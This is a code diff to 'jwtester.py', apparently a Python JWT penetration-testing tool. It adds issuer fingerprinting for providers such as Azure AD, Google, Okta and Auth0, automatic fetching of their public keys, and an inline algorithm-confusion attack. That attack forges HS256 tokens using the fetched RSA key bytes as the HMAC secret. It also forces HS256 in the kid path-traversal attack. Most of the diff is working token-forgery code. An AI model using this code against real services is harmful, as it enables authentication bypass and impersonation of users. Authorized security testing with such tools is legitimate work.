@@ -17,6 +17,7 @@ Usage:
     python3 jwtester.py <jwt_file> --expire 9999999999      # Extend expiry
     python3 jwtester.py <jwt_file> --null-sig               # Null/empty signature
     python3 jwtester.py <jwt_file> --wordlist words.txt     # Custom wordlist
+    python3 jwtester.py <jwt_file> --fetch-pubkey              # Auto-fetch JWKS public key
 
 References & Inspiration:
     jwt_tool     - https://github.com/ticarpi/jwt_tool
@@ -42,6 +43,7 @@ Attacks Implemented:
 
 import sys, os, base64, json, hmac as _hmac, hashlib, re, time, copy
 import threading, secrets, math, argparse, textwrap, datetime
+import urllib.request, urllib.error
 from string import ascii_lowercase, ascii_uppercase, digits
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -84,7 +86,7 @@ def banner():
    88   8888  888             888    888     888  888o    8 888888888  
   o88o    88    88oooo888    o888o   888ooo888    88888oo8     888     
 {C.RESET}
-{C.DIM}  Advanced JWT Pentesting Framework v2.0 | Pure Python3 | No Deps  {C.RESET}
+{C.DIM}  Advanced JWT Pentesting Framework v2.1 | Pure Python3 | No Deps  {C.RESET}
 {C.DIM}  Inspired: jwt_tool, jwt-hack, PortSwigger JWT research           {C.RESET}
 """)
 
@@ -427,9 +429,99 @@ SEV_ICON = {
     'INFO':     '[ i ]',
 }
 
+
+# ─────────────────────────────────────────────────────────────────────────────
+# ISSUER FINGERPRINTING & JWKS AUTO-FETCH
+# ─────────────────────────────────────────────────────────────────────────────
+
+KNOWN_ISSUERS = {
+    'sts.windows.net':       ('Microsoft Azure AD / Entra ID', 'https://login.microsoftonline.com/{tenant}/discovery/v2.0/keys'),
+    'login.microsoftonline': ('Microsoft Azure AD / Entra ID', 'https://login.microsoftonline.com/{tenant}/discovery/v2.0/keys'),
+    'accounts.google.com':   ('Google',  'https://www.googleapis.com/oauth2/v3/certs'),
+    'securetoken.google':    ('Google Firebase', 'https://www.googleapis.com/service_accounts/v1/jwk/securetoken@system.gserviceaccount.com'),
+    'cognito-idp':           ('AWS Cognito', 'https://cognito-idp.{region}.amazonaws.com/{pool}/.well-known/jwks.json'),
+    'auth0.com':             ('Auth0', '{iss}/.well-known/jwks.json'),
+    'okta.com':              ('Okta',  '{iss}/v1/keys'),
+    'ping':                  ('PingIdentity', '{iss}/jwks'),
+    'salesforce.com':        ('Salesforce', '{iss}/id/keys'),
+    'adfs':                  ('Microsoft ADFS', '{iss}/adfs/discovery/keys'),
+    'b2clogin.com':          ('Azure AD B2C', '{iss}/.well-known/openid-configuration'),
+    'apple.com':             ('Apple Sign-In', 'https://appleid.apple.com/auth/keys'),
+    'facebook.com':          ('Facebook', 'https://www.facebook.com/.well-known/oauth/openid/jwks/'),
+    'line.me':               ('LINE', 'https://api.line.me/oauth2/v2.1/certs'),
+}
+
+def fingerprint_issuer(payload):
+    """Detect well-known token issuer from iss/aud claims. Returns (name, jwks_hint) or None."""
+    if not isinstance(payload, dict):
+        return None
+    iss = str(payload.get('iss', ''))
+    aud = str(payload.get('aud', ''))
+    combined = (iss + ' ' + aud).lower()
+    for pattern, (name, jwks_url) in KNOWN_ISSUERS.items():
+        if pattern.lower() in combined:
+            # Try to fill in tenant for Azure
+            if '{tenant}' in jwks_url and 'sts.windows.net' in iss:
+                try:
+                    tenant = iss.rstrip('/').split('/')[-1]
+                    jwks_url = jwks_url.replace('{tenant}', tenant)
+                except Exception:
+                    pass
+            elif '{iss}' in jwks_url:
+                jwks_url = jwks_url.replace('{iss}', iss.rstrip('/'))
+            return name, jwks_url
+    return None
+
+def fetch_jwks_pubkey(jwks_url, kid=None):
+    """Fetch JWKS from URL, return PEM-like key info for matching kid. Returns list of (kid, n, e) tuples."""
+    try:
+        req = urllib.request.Request(jwks_url, headers={'User-Agent': 'JWTester/2.0'})
+        with urllib.request.urlopen(req, timeout=8) as resp:
+            data = json.loads(resp.read().decode())
+        keys = data.get('keys', [data] if 'n' in data else [])
+        results = []
+        for k in keys:
+            if k.get('kty') != 'RSA': continue
+            k_kid = k.get('kid', '')
+            if kid and k_kid != kid: continue
+            # Decode n and e from base64url
+            def b64u_to_int(s):
+                s = s.replace('-','+').replace('_','/')
+                pad = (4 - len(s) % 4) % 4
+                return int.from_bytes(base64.b64decode(s + '='*pad), 'big')
+            n = b64u_to_int(k['n'])
+            e = b64u_to_int(k['e'])
+            results.append((k_kid, n, e))
+        return results
+    except Exception as ex:
+        return []
+
+def kid_looks_like_thumbprint(kid):
+    """Heuristic: does this kid look like a cert thumbprint (base64url of fixed-length hash)?"""
+    if not kid: return False
+    clean = kid.replace('-','').replace('_','').replace('=','')
+    # SHA-1 thumbprint base64url = 27-28 chars; SHA-256 = 43 chars
+    return re.match(r'^[A-Za-z0-9_-]{20,50}$', kid) and len(kid) in range(20, 55)
+
 def scan(header, payload, sig, parts):
     findings = []
     alg = str(header.get('alg', '')).upper() if isinstance(header, dict) else ''
+
+    # Issuer fingerprint (info, not a vuln itself)
+    issuer_info = fingerprint_issuer(payload)
+    if issuer_info:
+        name, jwks_url = issuer_info
+        findings.append(Finding('INFO', f'Known Issuer: {name}',
+            f'Token issued by {name}. JWKS endpoint: {jwks_url}\n'
+            '    KID/x5t injection attacks target the RECEIVING application library, not this issuer.',
+            f'--fetch-pubkey to auto-retrieve public key for confusion attack'))
+
+    # x5t / x5t#S256 (cert thumbprint in header)
+    if isinstance(header, dict) and ('x5t' in header or 'x5tS256' in header):
+        x5t_val = header.get('x5t') or header.get('x5tS256','')
+        findings.append(Finding('LOW', 'x5t Certificate Thumbprint in Header',
+            f'x5t={x5t_val!r}. Server uses this to look up certificate from its store.',
+            'Informational — hard to exploit without certificate store access.'))
 
     # A1: None algorithm
     if alg == 'NONE':
@@ -469,9 +561,16 @@ def scan(header, payload, sig, parts):
     # A5: KID present
     if isinstance(header, dict) and 'kid' in header:
         kid_val = str(header['kid'])
-        findings.append(Finding('HIGH', 'KID Parameter Present',
-            f'kid={kid_val!r}. If used to look up keys from DB or filesystem, injection may work.',
-            '--kid-sqli (SQL injection) or --kid-path (path traversal)'))
+        is_thumbprint = kid_looks_like_thumbprint(kid_val)
+        if is_thumbprint:
+            findings.append(Finding('MEDIUM', 'KID Looks Like Certificate Thumbprint',
+                f'kid={kid_val!r} appears to be a cert thumbprint (base64url hash).\n'
+                '    Likely used for JWKS key lookup by kid match — injection less likely but still test.',
+                '--kid-sqli / --kid-path target the receiving lib, not the issuer JWKS store'))
+        else:
+            findings.append(Finding('HIGH', 'KID Parameter Present',
+                f'kid={kid_val!r}. If server fetches key from DB or filesystem by kid, injection may work.',
+                '--kid-sqli (SQL injection) or --kid-path (path traversal)'))
         sqli_signs = ("'", '"', ';', '--', '/*', 'union ', 'select ', 'or 1', 'drop ')
         if any(s in kid_val.lower() for s in sqli_signs):
             findings.append(Finding('CRITICAL', 'Possible SQL Injection in KID',
@@ -788,7 +887,9 @@ def attack_kid_path(header, payload):
 
     results = []
     for path, signing_secret, desc in path_payloads:
+        # Path traversal assumes server reads file as HMAC key — force HS256
         h2 = copy.deepcopy(header)
+        h2['alg'] = 'HS256'
         h2['kid'] = path
         if signing_secret is not None:
             token = jwt_build(h2, payload, signing_secret if signing_secret else None)
@@ -994,6 +1095,7 @@ def main():
     ap.add_argument('--expire',      metavar='EPOCH_TS',  type=int, help='New exp timestamp [A8]')
     ap.add_argument('--null-sig',    action='store_true', help='Null/empty signature variants [A9]')
     ap.add_argument('--jku-hint',    action='store_true', help='Show JKU/X5U injection steps [A6]')
+    ap.add_argument('--fetch-pubkey', action='store_true', help='Auto-fetch RSA public key from JWKS for confusion attack [A2]')
     ap.add_argument('--no-scan',     action='store_true', help='Skip vulnerability scan')
     ap.add_argument('--no-color',    action='store_true', help='Disable ANSI color output')
     ap.add_argument('--out',         metavar='OUTPUT_FILE', help='Save all forged tokens to file')
@@ -1059,7 +1161,7 @@ def main():
     any_attack = any([
         args.all, args.none, args.crack, args.secret, args.pubkey,
         args.jwk, args.kid_sqli, args.kid_path, args.forge,
-        args.expire is not None, args.null_sig, args.jku_hint
+        args.expire is not None, args.null_sig, args.jku_hint, args.fetch_pubkey
     ])
 
     if not any_attack:
@@ -1095,6 +1197,39 @@ def main():
             secret_bytes = found.encode() if isinstance(found, str) else found
             args.secret  = found
             print(f"  {C.DIM}[*] Cracked secret will be used for remaining forgeries.{C.RESET}")
+
+    if args.fetch_pubkey or (args.all and str(header.get('alg','')).startswith('RS')):
+        section("Auto-Fetch RSA Public Key [--fetch-pubkey]")
+        issuer_info = fingerprint_issuer(payload)
+        kid_val = header.get('kid','') if isinstance(header, dict) else ''
+        if issuer_info:
+            _, jwks_url = issuer_info
+            print(f"  {C.DIM}[*] Fetching JWKS from: {jwks_url}{C.RESET}")
+            keys = fetch_jwks_pubkey(jwks_url, kid=kid_val)
+            if keys:
+                for k_kid, n, e in keys:
+                    print(f"  {C.GREEN}[+] Got RSA public key kid={k_kid!r} ({n.bit_length()} bits){C.RESET}")
+                    # Build fake PEM for confusion attack
+                    from_n_e_pem = f"  n={hex(n)}\n  e={e}"
+                    print(f"  {C.DIM}Run confusion attack using fetched key as HMAC secret:{C.RESET}")
+                    # Do the confusion attack inline with fetched key
+                    h_conf = copy.deepcopy(header)
+                    h_conf['alg'] = 'HS256'
+                    # Use raw n bytes as HMAC secret (DER-like minimal)
+                    n_bytes = n.to_bytes((n.bit_length()+7)//8, 'big')
+                    e_bytes = e.to_bytes((e.bit_length()+7)//8, 'big')
+                    for label, secret in [
+                        ("HMAC(n_bytes)", n_bytes),
+                        ("HMAC(e_bytes+n_bytes)", e_bytes + n_bytes),
+                    ]:
+                        t = jwt_build(h_conf, payload, secret)
+                        show_forged(f"Confusion with fetched key — {label}", t)
+                        forged_tokens.append((f"fetched_confusion_{label}", t))
+            else:
+                print(f"  {C.YELLOW}[-] Could not fetch keys from {jwks_url}{C.RESET}")
+                print(f"  {C.DIM}Tip: Try manually: curl {jwks_url}{C.RESET}")
+        else:
+            print(f"  {C.YELLOW}[!] Unknown issuer — cannot auto-fetch JWKS. Use --pubkey instead.{C.RESET}")
 
     if args.pubkey:
         try:
